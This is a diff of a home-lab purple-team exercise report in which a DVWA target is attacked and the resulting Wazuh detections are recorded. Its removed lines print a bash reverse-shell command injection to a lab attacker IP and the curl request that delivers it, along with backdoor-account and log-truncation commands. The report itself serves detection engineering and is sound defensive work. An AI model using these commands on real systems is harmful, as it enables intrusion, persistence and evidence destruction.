@@ -8,39 +8,39 @@
 | Scenario Name | Forgotten Service |
 | MITRE Tactics | Discovery, Initial Access, Execution, Persistence, Defense Evasion |
 | Attacker | kali01 — 10.10.10.20 |
-| Target | target01 — 10.10.10.30 |
+| Target | target01 — 10.10.10.30 (DVWA, Apache, vsftpd) |
 | Gateway | fw01 — 10.10.10.1 |
 | SIEM | Wazuh on node03 — 192.168.178.28 |
 | Date | 2026-06-23 |
-| Result | In Progress |
+| Result | Partial — reverse shell achieved, privilege escalation blocked |
 
 ---
 
 ## Scenario Description
 
-A web application (DVWA) is running on an internal server in an isolated network zone. The application was deployed for testing and never hardened — default credentials were never changed, the security level was left unconfigured, and no firewall rules restrict access to it from within the attack zone.
+A web application (DVWA) is running on an internal server in an isolated network zone. The application was deployed for testing and never hardened — default credentials were never changed, the security level was left at `impossible` in the PHP session default, and no firewall rules restrict web access from within the attack zone.
 
-An attacker who has gained a foothold in the attack zone (simulating a compromised machine or insider threat) discovers the service, logs in with default credentials, and exploits a command injection vulnerability to establish a reverse shell. Once inside, they create a backdoor account for persistent access, then attempt to cover their tracks by clearing authentication logs.
+An attacker who has gained a foothold in the attack zone discovers the service via network scanning, logs in with default credentials, and exploits a command injection vulnerability to establish a reverse shell. However, privilege escalation fails — no credential reuse is possible and no misconfigured sudo rules exist — blocking the persistence and defense evasion stages.
 
-This scenario simulates a realistic post-compromise attack chain against a forgotten or misconfigured internal service — a common finding in real-world penetration tests and incident investigations.
+This scenario demonstrates both a successful initial access and execution chain, and the value of hardened user permissions as a defensive control.
 
 ---
 
 ## Attack Chain Overview
 
-    T1046     Network scan — discover target01 and open services
-         │
-         ▼
-    T1190     Exploit DVWA with default credentials (admin/password)
-         │
-         ▼
-    T1059.004 Command injection executes reverse shell back to kali01
-         │
-         ▼
-    T1136.001 Create backdoor local Linux account for persistent access
-         │
-         ▼
-    T1070.002 Clear authentication logs to cover tracks
+    T1046     Network scan — discover target01 and open services      <- Executed
+         |
+         v
+    T1190     Exploit DVWA with default credentials (admin/password)  <- Executed
+         |
+         v
+    T1059.004 Python reverse shell via command injection              <- Executed / Partial Detection
+         |
+         v
+    T1136.001 Create backdoor local account                          <- BLOCKED (no privesc path)
+         |
+         v
+    T1070.002 Clear logs to cover tracks                             <- NOT ATTEMPTED
 
 ---
 
@@ -48,7 +48,7 @@ This scenario simulates a realistic post-compromise attack chain against a forgo
 
 - kali01 running on the attack zone (10.10.10.20)
 - target01 running with DVWA installed and Apache running (10.10.10.30)
-- DVWA security level set to low
+- DVWA security level set to low via Apache environment variable
 - Wazuh agent active on target01
 - auditd running on target01
 
@@ -58,36 +58,33 @@ This scenario simulates a realistic post-compromise attack chain against a forgo
 
 ### What This Technique Is
 
-Network scanning is how an attacker maps the environment after gaining initial access to a network segment. By sending probes to a range of IP addresses and ports, the attacker discovers which hosts are alive and what services they expose. This is typically one of the first actions taken after gaining a foothold.
+Network scanning is how an attacker maps the environment after gaining initial access to a network segment. By sending probes to a range of IP addresses and ports, the attacker discovers which hosts are alive and what services they expose.
 
 ### Attack
 
-From kali01, scan the attack zone to discover live hosts and open services:
-
     sudo nmap -sV -sC 10.10.10.0/24
 
-| Flag | Meaning |
-|---|---|
-| `-sV` | Version detection — identify what software is running on each port |
-| `-sC` | Default scripts — run common enumeration scripts |
-| `10.10.10.0/24` | Scan the entire attack zone subnet |
+### Findings
 
-### Expected Output
+Three hosts discovered:
 
-    Nmap scan report for 10.10.10.30
-    PORT   STATE SERVICE VERSION
-    22/tcp open  ssh     OpenSSH 9.6p1
-    80/tcp open  http    Apache httpd 2.4.58
+| Host | Ports | Services |
+|---|---|---|
+| 10.10.10.1 (fw01) | 22 | OpenSSH 9.6p1 |
+| 10.10.10.20 (kali01) | 22 | OpenSSH 10.3p1 |
+| 10.10.10.30 (target01) | 21, 22, 80 | vsftpd 3.0.5, OpenSSH 9.6p1, Apache 2.4.58 |
 
-Port 80 reveals an Apache web server — follow up with a targeted scan:
+Notable observation: fw01 and target01 share identical SSH host keys — both built from the same golden image. This is an anomaly that would stand out to an analyst reviewing SSH fingerprints.
+
+Followed up with HTTP enumeration:
 
     sudo nmap -sV -p 80 --script http-enum 10.10.10.30
 
-The `http-enum` script discovers common web application paths, revealing `/dvwa/` in the results.
+Apache default page confirmed. DVWA discovered by manual browsing to /dvwa/.
 
 ### Detection
 
-Wazuh is host-based and cannot see network traffic directly. This stage will not generate alerts in Wazuh. A network sensor (Suricata on fw01) would detect the port scan — this is a gap in the current detection coverage.
+Not detected. Wazuh is host-based and cannot see network traffic. No network sensor is deployed on fw01. This is a documented detection gap — Suricata deployment on fw01 is planned for Phase 7.
 
 ---
 
@@ -95,219 +92,157 @@ Wazuh is host-based and cannot see network traffic directly. This stage will not
 
 ### What This Technique Is
 
-Many web applications ship with default credentials that administrators never change. An attacker who discovers a login page will always try common defaults before attempting anything more sophisticated. DVWA's default credentials (`admin` / `password`) are publicly documented and will succeed against any unmodified installation.
+DVWA ships with default credentials (admin / password) that are publicly documented. An attacker discovering a DVWA login page will always try these before anything else. The application was deployed for testing and the credentials were never changed.
 
 ### Attack
 
-Open a browser or use curl from kali01 to access DVWA:
-
     http://10.10.10.30/dvwa/login.php
+    Username: admin
+    Password: password
 
-Log in with default credentials:
+Login successful — redirected to index.php.
 
-| Field | Value |
-|---|---|
-| Username | admin |
-| Password | password |
-
-Alternatively via curl (requires CSRF token — see prerequisites):
-
-    # Get login page token
-    curl -s -c /tmp/dvwa_cookies.txt http://10.10.10.30/dvwa/login.php | grep "user_token"
-
-    # Login with token
-    curl -s -c /tmp/dvwa_cookies.txt -b /tmp/dvwa_cookies.txt \
-      -X POST http://10.10.10.30/dvwa/login.php \
-      --data "username=admin&password=password&Login=Login&user_token=TOKEN_HERE" \
-      -D - | grep "Location"
-
-A redirect to `index.php` confirms successful authentication.
+Security level confirmed as low (set via Apache environment variable DEFAULT_SECURITY_LEVEL=low).
 
 ### Detection
 
-DVWA login attempts are not captured by auditd (kernel-level) or auth.log (SSH/sudo only). Apache access logs on target01 record the HTTP requests but Wazuh is not configured to ingest Apache logs by default. This is a detection gap — adding Apache log monitoring to the Wazuh agent config would close it.
+Not detected. Apache access logs record the HTTP POST to /dvwa/login.php but Wazuh is not configured to ingest Apache logs on target01. This is a documented detection gap — adding Apache log monitoring to the Wazuh agent configuration would detect this.
 
 ---
 
-## Stage 3 — T1059.004: Command Injection Reverse Shell
+## Stage 3 — T1059.004: Python Reverse Shell via Command Injection
 
 ### What This Technique Is
 
-DVWA's Command Execution module takes user input and passes it directly to a system shell command without sanitisation. At security level `low`, there is no filtering whatsoever — any shell metacharacter (`;`, `|`, `&&`) appended to the input will cause additional commands to execute on the server.
+DVWA's Command Execution module passes user input directly to a system shell without sanitisation. At security level low there is no filtering. Appending a shell command after ; causes it to execute on the server as www-data.
 
-A reverse shell is a connection initiated by the victim machine back to the attacker. The attacker listens on a port; the victim runs a command that connects back and hands over an interactive shell. This is the standard technique for converting command injection into full shell access.
+A standard bash reverse shell (bash -i >& /dev/tcp/...) failed — PHP's process execution context prevented the shell from staying open. A Python reverse shell using socket redirection was used instead, which is more reliable from a web execution context.
 
 ### How the Injection Works
 
-The DVWA ping command runs something equivalent to:
+The DVWA ping command executes:
 
     ping -c 4 [USER_INPUT]
 
-By injecting `;bash -i >& /dev/tcp/10.10.10.20/4444 0>&1` after a valid IP, the server executes:
-
-    ping -c 4 127.0.0.1;bash -i >& /dev/tcp/10.10.10.20/4444 0>&1
-
-The `;` ends the ping command. The `bash -i` opens an interactive shell. The `>& /dev/tcp/10.10.10.20/4444` redirects stdin, stdout, and stderr over a TCP connection to kali01 on port 4444. The attacker receives a live shell running as `www-data`.
+Injecting ;python3 -c '...' after a valid IP causes the server to run both the ping and the Python reverse shell.
 
 ### Attack
 
-**Step 1 — Set up listener on kali01:**
+Step 1 — Set up listener on kali01:
 
     nc -lvnp 4444
 
-| Flag | Meaning |
-|---|---|
-| `-l` | Listen for incoming connections |
-| `-v` | Verbose output |
-| `-n` | No DNS resolution |
-| `-p 4444` | Listen on port 4444 |
+Step 2 — Login to DVWA and get CSRF token, then execute Python reverse shell via command injection targeting 10.10.10.20:4444.
 
-**Step 2 — Execute injection via curl:**
+Step 3 — Upgrade shell:
 
-    # Get exec page token (must be logged in)
-    curl -s -m 10 -c /tmp/dvwa_cookies.txt -b /tmp/dvwa_cookies.txt \
-      http://10.10.10.30/dvwa/vulnerabilities/exec/ | grep "user_token"
+    python3 -c 'import pty; pty.spawn("/bin/bash")'
 
-    # Submit injection payload
-    curl -s -m 10 -c /tmp/dvwa_cookies.txt -b /tmp/dvwa_cookies.txt \
-      -X POST http://10.10.10.30/dvwa/vulnerabilities/exec/ \
-      --data "ip=127.0.0.1%3Bbash+-i+>%26+/dev/tcp/10.10.10.20/4444+0>%261&Submit=Submit&user_token=TOKEN_HERE"
-
-The netcat listener on kali01 receives a shell running as `www-data` on target01.
-
-**Step 3 — Verify shell access:**
-
-    id
-    hostname
-    whoami
-
-Expected output:
+Shell confirmed:
 
     uid=33(www-data) gid=33(www-data) groups=33(www-data)
-    target01
-    www-data
+    hostname: target01
 
-### Detection
+### Detection — Partial
 
-auditd on target01 captures the `execve` syscall when bash spawns. The Wazuh agent forwards this to node03. Custom rule 100003 fires because the process has an interactive TTY (`pts/X`).
+Rule 100003 (auditd TTY filter) did not fire. This is a confirmed detection gap.
 
-| Rule ID | Level | Description |
-|---|---|---|
-| 100003 | 14 | Interactive process execution detected via auditd |
+The Python reverse shell uses os.dup2 to redirect file descriptors rather than spawning a new process with a TTY. At the point of the initial execve syscall that auditd captures, no TTY is assigned — the TTY filter condition (audit.tty != (none)) filters it out as if it were a headless process.
 
-Alert fields:
+Wazuh did detect the sudo attempts made from the shell:
 
-| Field | Value |
-|---|---|
-| `rule.id` | 100003 |
-| `audit.exe` | /usr/bin/bash |
-| `audit.tty` | pts0 |
-| `audit.execve.a2` | bash -i >& /dev/tcp/10.10.10.20/4444 0>&1 |
-| `agent.name` | target01 |
+| Timestamp | Rule ID | Level | Description |
+|---|---|---|---|
+| 12:07:39 | 5405 | 5 | Unauthorized user attempted to use sudo |
+| 12:07:31 | 5405 | 5 | Unauthorized user attempted to use sudo |
+| 12:01:53 | 533 | 7 | Listened ports status changed (new port opened) |
 
-The full reverse shell command including the attacker IP and port is visible in the alert.
+The port change alert (rule 533) fired when the reverse shell connection was established — this is a useful indirect indicator of compromise.
 
----
+### Detection Gap — New Sigma Rule
 
-## Stage 4 — T1136.001: Create Local Account
-
-### What This Technique Is
-
-After establishing a foothold, attackers create backdoor accounts to ensure persistent access even if the original vulnerability is patched or the web shell is discovered. A local Linux account with sudo access provides reliable re-entry.
-
-### Attack
-
-From the reverse shell on target01 (running as `www-data`):
-
-    sudo useradd -m -s /bin/bash backdoor
-    sudo passwd backdoor
-    sudo usermod -aG sudo backdoor
-
-This creates a user `backdoor` with a home directory, bash shell, and sudo privileges.
-
-Verify:
-
-    id backdoor
-    cat /etc/passwd | grep backdoor
-
-### Detection
-
-User creation via `useradd` generates an entry in `/var/log/auth.log` and is captured by auditd. Wazuh has built-in rules for account creation events.
-
-| Rule ID | Level | Description |
-|---|---|---|
-| 5902 | 8 | New user added to the system |
-
-Additionally rule 100003 fires again on the `useradd` execve call since it runs interactively.
+A new Sigma rule T1059.004-python-reverse-shell.yml was written to detect Python processes with socket/subprocess patterns in their arguments, independent of TTY status. This rule targets the EXECVE log entry for the python3 process itself rather than the spawned shell.
 
 ---
 
-## Stage 5 — T1070.002: Clear Linux Logs
+## Stage 4 — T1136.001: Create Backdoor Account
 
-### What This Technique Is
+### Result: BLOCKED
 
-After completing their objectives, attackers attempt to remove evidence of their presence. On Linux systems, authentication logs (`/var/log/auth.log`) and audit logs (`/var/log/audit/audit.log`) contain records of every action taken. Clearing these files removes the evidence trail — or so the attacker hopes.
+Privilege escalation was exhausted before this stage could be attempted.
 
-### Attack
+### Escalation paths attempted from www-data shell
 
-From the reverse shell on target01:
-
-    sudo truncate -s 0 /var/log/auth.log
-    sudo truncate -s 0 /var/log/audit/audit.log
-    sudo truncate -s 0 /var/log/syslog
-
-### Detection
-
-This is where the layered detection architecture proves its value. Even though the local logs on target01 are cleared, the Wazuh agent had already forwarded log events to the Wazuh manager on node03 in real time. Clearing local logs does not affect events already shipped to the SIEM.
-
-Additionally, the truncation itself is an auditable event captured by auditd before the log is cleared, and Wazuh has a built-in rule for log clearing:
-
-| Rule ID | Level | Description |
+| Method | Result | Notes |
 |---|---|---|
-| 591 | 8 | Log file cleared |
+| sudo useradd | Denied | www-data has no sudo rights |
+| SUID binaries | No exploitable binaries | Standard Ubuntu set only |
+| MySQL root via socket | Access denied | Root only allows local socket auth |
+| MySQL FILE privilege | Permission denied | dvwa user has no FILE grant |
+| Credential reuse (p@ssw0rd) | Auth failure | DVWA db password not reused on system |
+| Cron job write | Permission denied | No writable cron paths |
+| /etc/passwd write | Permission denied | Root-owned, world-readable only |
 
-The attempt to cover tracks is itself detected.
+### Why This Is Good News
+
+The privilege escalation failure is a direct result of correct configuration:
+
+- www-data has no sudo rights
+- No NOPASSWD entries for web service accounts
+- No credential reuse between application and system accounts
+- MySQL root protected by socket authentication
+
+In a real engagement this would be documented as a finding that the defensive controls on target01 are effective.
+
+---
+
+## Stage 5 — T1070.002: Clear Logs
+
+### Result: NOT ATTEMPTED
+
+Stage 4 was blocked. Log clearing was not attempted as there was nothing meaningful to cover — the attacker did not achieve elevated access and the primary evidence (Wazuh alerts already forwarded to node03) cannot be cleared from the target anyway.
 
 ---
 
 ## Detection Summary
 
-| Stage | Technique | Detected | Rule | Gap |
+| Stage | Technique | Result | Wazuh Rule | Notes |
 |---|---|---|---|---|
-| 1 — Network scan | T1046 | No | None | No network sensor on fw01 |
-| 2 — Default credentials | T1190 | No | None | Apache logs not ingested by Wazuh |
-| 3 — Reverse shell | T1059.004 | Yes | 100003 | None |
-| 4 — Backdoor account | T1136.001 | Yes | 5902, 100003 | None |
-| 5 — Log clearing | T1070.002 | Yes | 591 | None |
+| 1 — Network scan | T1046 | Not detected | None | No network sensor on fw01 |
+| 2 — Default credentials | T1190 | Not detected | None | Apache logs not in Wazuh |
+| 3 — Reverse shell | T1059.004 | Partial | 533, 5405 | Rule 100003 bypassed by Python shell |
+| 4 — Backdoor account | T1136.001 | Blocked | N/A | No privilege escalation path |
+| 5 — Log clearing | T1070.002 | Not attempted | N/A | Blocked by stage 4 |
 
 ---
 
 ## Detection Gaps and Recommendations
 
 ### Gap 1 — Network scanning not detected (T1046)
-Deploy Suricata on fw01 in IDS mode on the eth1 interface (attack zone). Suricata's port scan detection rules would alert on the nmap scan before the attacker reaches the web application. This is Phase 7 of the lab roadmap.
+Deploy Suricata on fw01 in IDS mode on eth1. Planned for Phase 7.
 
 ### Gap 2 — Web application login not detected (T1190)
-Configure the Wazuh agent on target01 to ingest Apache access logs (`/var/log/apache2/access.log`). A custom rule matching `POST /dvwa/login.php` with a 302 response would detect successful logins. Failed login attempts would also be visible.
+Configure Wazuh agent on target01 to ingest Apache access logs. A custom rule matching POST to /dvwa/login.php with a 302 response would detect successful logins.
 
-### Gap 3 — Reverse shell egress not detected at network level
-The reverse shell connection from target01 to kali01 on port 4444 passes through fw01 and is allowed by the current nftables rules (attack zone to internet/WAN is permitted). Suricata on fw01 would detect this as an anomalous outbound connection. Alternatively, nftables could be tightened to only allow specific outbound ports from the attack zone.
+### Gap 3 — Python reverse shell bypasses TTY detection (T1059.004)
+Rule 100003 relies on audit.tty != (none). Python reverse shells using os.dup2 bypass this because no TTY is assigned at execve time. New Sigma rule T1059.004-python-reverse-shell.yml added to detections/sigma/ to address this.
 
 ---
 
-## Defensive Controls
+## Defensive Controls Validated
 
-| Control | Effect |
-|---|---|
-| Change default DVWA credentials | Prevents T1190 entirely |
-| Disable DVWA command execution module | Prevents T1059.004 |
-| Run Apache as a non-privileged user without sudo | Limits T1136.001 — www-data cannot create users without sudo |
-| Suricata on fw01 | Detects T1046 and reverse shell egress |
-| Apache log ingestion in Wazuh | Detects T1190 |
-| Wazuh active response | Auto-block attacker IP when rule 100003 fires |
+| Control | Status | Effect |
+|---|---|---|
+| www-data has no sudo rights | Confirmed effective | Blocked T1136.001 |
+| No credential reuse | Confirmed effective | Blocked privilege escalation |
+| MySQL socket auth for root | Confirmed effective | Blocked MySQL-based privesc |
+| Wazuh real-time log forwarding | Confirmed effective | Log clearing would not erase evidence |
 
 ---
 
 ## Sigma Rules
 
-Sigma rules for T1059.004 and T1070.002 are in `detections/sigma/`. T1046 and T1190 require network-level detection (Suricata) which is planned for Phase 7.
+| File | Technique | Status |
+|---|---|---|
+| detections/sigma/T1059.004-reverse-shell.yml | Interactive shell via auditd TTY | Existing |
+| detections/sigma/T1059.004-python-reverse-shell.yml | Python reverse shell via socket | New — added as result of this exercise |
